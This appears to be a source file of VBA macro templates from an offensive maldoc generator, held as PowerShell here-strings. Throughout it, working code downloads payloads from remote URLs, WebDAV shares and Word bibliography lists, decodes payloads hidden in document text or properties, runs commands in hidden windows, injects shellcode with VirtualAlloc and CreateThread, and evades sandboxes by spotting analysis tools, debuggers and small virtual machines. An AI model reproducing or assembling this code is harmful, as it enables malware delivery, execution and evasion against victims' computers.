#------------------------------------------------------------------------------------------
$base64Decode=@"
Private Function #Base64Decode#(s)
    Set _xmlObj_ = CreateObject(-"MSXml2.DOMDocument"-)
    Set _docElement_ = _xmlObj_.createElement(-"Base64Data"-)
    _docElement_.dataType = -"bin.base64"-
    _docElement_.Text = s
    #Base64Decode# = _docElement_.nodeTypedValue
End Function

"@

#------------------------------------------------------------------------------------------
$decodePayloadInBody=@"
Private Function #DecodePayloadInBody#(ByVal _marker_ As String)
    Dim p As Paragraph
    Dim Text As String
    Dim _MarkerFound_ As Boolean
	Dim _offset_, _counter_, _size_ As Integer
	Dim _bytes_() As Byte
    Dim b As Byte
    
    _size_ = 0
    _counter_ = 0
    For Each p In ActiveDocument.Paragraphs
        DoEvents
            Text = p.Range.Text
        If (_MarkerFound_ = True) Then
			ReDim Preserve _bytes_(_size_ + (Len(Text)/4)-1) As Byte
			_size_ = _size_ + (Len(Text)/4)
            _offset_ = 1
            While (_offset_ < Len(Text))
                b = Mid(Text, _offset_, 4)
                _bytes_(_counter_) = b
                _offset_ = _offset_ + 4
				_counter_ = _counter_ + 1
            Wend
        ElseIf (InStr(1, Text, _marker_) > 0 And Len(Text) > 0) Then
            _MarkerFound_ = True
        End If
    Next
    #DecodePayloadInBody# = _bytes_
End Function

"@

#------------------------------------------------------------------------------------------
$decodePayloadInComment=@"
Private Function #DecodePayloadInComment#()
    Dim _prop_ As DocumentProperty
	Dim _bytes_() As Byte

	For Each _prop_ In ActiveDocument.BuiltInDocumentProperties
		If _prop_.Name = -"Comments"- Then
		   _bytes_= #Base64Decode#(_prop_.Value)
		   Exit For
		End If
	Next
 
    #DecodePayloadInComment# = _bytes_
End Function

"@

#------------------------------------------------------------------------------------------
$downloadBiblioSources=@"
Private Function #DownloadBiblioSources#(_url_)
    On Error Resume Next
    Application.LoadMasterList(_url_)
    Set xml = CreateObject(-"MSXml2.DOMDocument"-)
    xml.LoadXML (Application.Bibliography.Sources(1).xml)

    Dim _bytes_() As Byte
	_bytes_ = #Base64Decode#(xml.SelectSingleNode(-"//Title"-).Text)
	#DownloadBiblioSources# = _bytes_
End Function

"@

#------------------------------------------------------------------------------------------
$downloadWebDAV=@"
Private Function #DownloadWebDAV#(ByVal _unc_ As String)
	Dim tmp As String, _result_ As String
    Dim _flag_ As Boolean
   
    tmp = Dir(_unc_, vbNormal)
    
    _flag_ = True
    While _flag_ = True
        If tmp = "" Then
            _flag_ = False
        Else
            _result_ = _result_ + tmp
            tmp = Dir
        End If
    Wend
    
    _result_ = Replace(_result_, vbCrLf, "")
    _result_ = Replace(_result_, "_", "/")
    
    Dim _bytes_() As Byte
    _bytes_ = #Base64Decode#(_result_)
    #DownloadWebDAV# = _bytes_
End Function

"@

#------------------------------------------------------------------------------------------
$downloadURLWithIE=@"
Private Function #DownloadURLWithIE#(_url_)
    Dim _bytes_() As Byte
	Dim _ie_ As Object
	
	Set _ie_ = CreateObject(-"InternetExplorer.Application"-)
    _ie_.Visible = False
    _ie_.Navigate _url_
    Do Until _ie_.ReadyState = 4
      DoEvents
    Loop
       
    _bytes_ = #Base64Decode#(_ie_.Document.getElementById("data").innerText)
    
    _ie_.Quit
    Set _ie_ = Nothing
	
	#DownloadURLWithIE# = _bytes_
End Function

"@

#------------------------------------------------------------------------------------------
$executeCommandOne=@"
Private Sub #ExecuteCommandOne#(ByVal str As String)
	Set _objWMIService_ = GetObject(-"winmgmts:\\.\root\cimv2"-)
	Set _objStartup_ = _objWMIService_.Get(-"Win32_ProcessStartup"-)
	Set _objConfig_ = _objStartup_.SpawnInstance_
	_objConfig_.ShowWindow = 0
	Set _objProcess_ = GetObject(-"winmgmts:\\.\root\cimv2:Win32_Process"-)
	_objProcess_.Create str, Null, _objConfig_, _intProcessID_
End Sub

"@

#------------------------------------------------------------------------------------------
$executeCommandTwo=@"
Private Sub #ExecuteCommandTwo#(ByVal str As String)
	Dim res As Integer
	res = Shell(str, 0)
End Sub

"@

#------------------------------------------------------------------------------------------
$executeCommandThree=@"
Private Sub #ExecuteCommandThree#(ByVal str As String)
	Dim _wsh_ As Object
	Set _wsh_ = CreateObject(-"WScript.Shell"-)
	_wsh_.Run -"FORFILES /P C:\WINDOWS /m hh.exe /c "- & """" & str & """", 0, True
End Sub

"@

#------------------------------------------------------------------------------------------
$executeShellcodeHeaders=@"
#If VBA7 Then
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Fkfpnhh As Long, ByVal Xref As Long, ByVal Jxnj As LongPtr, Mlgstptp As Long, ByVal Bydro As Long, Rny As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Kqkx As Long, ByVal Lxnvzgxp As Long, ByVal Qylxwyeq As Long, ByVal Jpcp As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Sreratdzx As LongPtr, ByRef Bzcaonphm As Any, ByVal Vxquo As Long) As LongPtr
#Else
    Private Declare Function CreateThread Lib "kernel32" (ByVal Fkfpnhh As Long, ByVal Xref As Long, ByVal Jxnj As Long, Mlgstptp As Long, ByVal Bydro As Long, Rny As Long) As Long
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Kqkx As Long, ByVal Lxnvzgxp As Long, ByVal Qylxwyeq As Long, ByVal Jpcp As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Sreratdzx As Long, ByRef Bzcaonphm As Any, ByVal Vxquo As Long) As Long
#End If

"@

#------------------------------------------------------------------------------------------
$executeShellcode=@"
Private Function #ExecuteShellcode#(_shellcodeBytes_)
    Dim _byteValue_ As Long, _offset_ As Long
	
#If VBA7 Then
    Dim _baseAddress_ As LongPtr, res As LongPtr
#Else
    Dim _baseAddress_ As Long, res As Long
#End If

    _baseAddress_ = VirtualAlloc(0, UBound(_shellcodeBytes_), &H1000, &H40)
    For _offset_ = LBound(_shellcodeBytes_) To UBound(_shellcodeBytes_)
        _byteValue_ = _shellcodeBytes_(_offset_)
        res = RtlMoveMemory(_baseAddress_ + _offset_, _byteValue_, 1)
    Next _offset_
    res = CreateThread(0, 0, _baseAddress_, 0, 0, 0)
End Function

"@

#------------------------------------------------------------------------------------------
$invertCaesar=@"
Private Function #InvertCaesar#(ByVal _k_ As Integer, ByVal _data_ As String)
    Dim i, n, s As Integer
    
    For i = 1 To Len(_data_)
        n = Asc(Mid(_data_, i, 1))
        s = n - _k_
        If s < 32 Then
            s = s + 94
        End If
        Mid(_data_, i, 1) = Chr(s)
    Next
    #InvertCaesar# = _data_
End Function

"@

#------------------------------------------------------------------------------------------
$saveToFile=@"
Private Function #SaveToFile#(ByRef _data_() As Byte, ByVal _fileName_ As String)
    Dim res, f As Integer
    Dim _UserProfile_ As String
	Dim _TempFileName_ As String
	Dim _DestFileName_ As String
	
	_UserProfile_ = Environ(-"TEMP"-) 
	_TempFileName_ =  _UserProfile_ & "\debug"
	_DestFileName_ = _UserProfile_ & "\" & _fileName_
    f = FreeFile()
    Open _TempFileName_ For Binary As #f
        writePos = 1
        Put #f, writePos, _data_
    Close #f

    res = Shell(-"cmd /c move "- & _TempFileName_ & " " & _DestFileName_, 0)
    
	Do Until Dir(_DestFileName_) <> ""
        DoEvents
    Loop
	
    #SaveToFile# = _DestFileName_
End Function

"@

#------------------------------------------------------------------------------------------
$evadeSandbox=@"
#If VBA7 Then
    Private Declare PtrSafe Function isDbgPresent Lib "kernel32" Alias "IsDebuggerPresent" () As Boolean
#Else 
    Private Declare Function isDbgPresent Lib "kernel32" Alias "IsDebuggerPresent" () As Boolean
#End If

Private Function #IsRunningInSandbox#() As Boolean
    If #IsFileNameNotAsHexes#() <> True Then
        #IsRunningInSandbox# = True
        Exit Function
    ElseIf #IsProcessListReliable#() <> True Then
        #IsRunningInSandbox# = True
        Exit Function
    ElseIf #IsHardwareReliable#() <> True Then
        #IsRunningInSandbox# = True
        Exit Function
    End If
    #IsRunningInSandbox# = False
End Function

Private Function #IsFileNameNotAsHexes#() As Boolean
    Dim _str_ As String
    Dim _hexes_ As Variant
    Dim _onlyHexes_ As Boolean
    
    _onlyHexes_ = True
    _hexes_ = Array("0", "1", "2", "3", "4", "5", "6", "7", _
                    "8", "9", "a", "b", "c", "d", "e", "f")
    _str_ = ActiveDocument.Name
    _str_ = Mid(_str_, 1, InStrRev(_str_, ".") - 1)
    
    For i = 1 To UBound(_hexes_, 1) - 1
        Dim ch As String
        ch = LCase(Mid(_str_, i, 1))
        If Not (UBound(Filter(_hexes_, ch)) > -1) Then
            _onlyHexes_ = False
            Exit For
        End If
    Next
    
    _onlyHexes_ = (Not _onlyHexes_)
    #IsFileNameNotAsHexes# = _onlyHexes_
End Function

Private Function #IsProcessListReliable#() As Boolean
    Dim _objWMIService_, _objProcess_, _colProcess_
    Dim _strComputer_, _strList_
    Dim _bannedProcesses_ As Variant
    
    _bannedProcesses_ = Array("fiddler", "vxstream", _
        "tcpview", "vmware", "procexp", "vmtools", "autoit", _
        "wireshark", "procmon", "idaq", "autoruns", "apatedns", _
        "windbg")
    
    _strComputer_ = "."

    Set _objWMIService_ = GetObject(-"winmgmts:{impersonationLevel=impersonate}!\\"- & _strComputer_ & -"\root\cimv2"-)
    
    Set _colProcess_ = _objWMIService_.ExecQuery _
    (-"Select * from Win32_Process"-)
    
    For Each _objProcess_ In _colProcess_
        For Each proc In _bannedProcesses_
            If InStr(LCase(_objProcess_.Name), LCase(proc)) <> 0 Then
                #IsProcessListReliable# = False
                Exit Function
            End If
        Next
    Next
    If isDbgPresent() Then
        #IsProcessListReliable# = False
        Exit Function
    End If
    #IsProcessListReliable# = (_colProcess_.Count() > 50)
End Function

Private Function #IsHardwareReliable#() As Boolean
    Dim _objWMIService_, _objItem_, _colItems_, _strComputer_
    Dim _totalSize_, _totalMemory_, _cpusNum_ As Integer
    
    _totalSize_ = 0
    _totalMemory_ = 0
    _cpusNum_ = 0
    
    Const wbemFlagReturnImmediately = &H10
    Const wbemFlagForwardOnly = &H20

    _strComputer_ = "."
    
    Set _objWMIService_ = GetObject _
    (-"winmgmts:\\"- & _strComputer_ & -"\root\cimv2"-)
    Set _colItems_ = _objWMIService_.ExecQuery _
    (-"Select * from Win32_LogicalDisk"-)
    
    For Each _objItem_ In _colItems_
        Dim num
        num = Int(_objItem_.Size / 1073741824)
        If num > 0 Then
            _totalSize_ = _totalSize_ + num
        End If
    Next
    
    If _totalSize_ < 60 Then
        #IsHardwareReliable# = False
        Exit Function
    End If
    
    Set _colComputer_ = _objWMIService_.ExecQuery _
    ("Select * from Win32_ComputerSystem")
    
    For Each _objComputer_ In _colComputer_
        _totalMemory_ = _totalMemory_ + Int((_objComputer_.TotalPhysicalMemory) / 1048576) + 1
    Next

    If _totalMemory_ < 1024 Then
        #IsHardwareReliable# = False
        Exit Function
    End If
    
    Set _colItems2_ = _objWMIService_.ExecQuery(-"SELECT * FROM Win32_Processor"-, "WQL", _
        wbemFlagReturnImmediately + wbemFlagForwardOnly)
        
    For Each _objItem_ In _colItems2_
        _cpusNum_ = _cpusNum_ + _objItem_.NumberOfLogicalProcessors
    Next
    
    If _cpusNum_ < 2 Then
        #IsHardwareReliable# = False
        Exit Function
    End If
    
    #IsHardwareReliable# = True
End Function

"@

#------------------------------------------------------------------------------------------
$sources=@"
<?xml version="1.0"?>
<Sources xmlns="http://schemas.openxmlformats.org/officeDocument/2006/bibliography">
<Source>
    <Tag>And01</Tag> 
    <SourceType>Book</SourceType> 
    <Author> 
        <Author> 
            <NameList> 
                <Person> 
                    <Last>Dixon</Last> 
                    <First>Andrew</First> 
                </Person> 
            </NameList> 
        </Author> 
    </Author> 
    <Title>PAYLOAD</Title>
    <Year>2006</Year> 
    <City>Chicago</City> 
    <Publisher>Adventure Works Press</Publisher> 
</Source>
</Sources>
"@

#------------------------------------------------------------------------------------------
$index=@"
<html>
<body>
<div id="data">PAYLOAD</div>
</body>
</html>
"@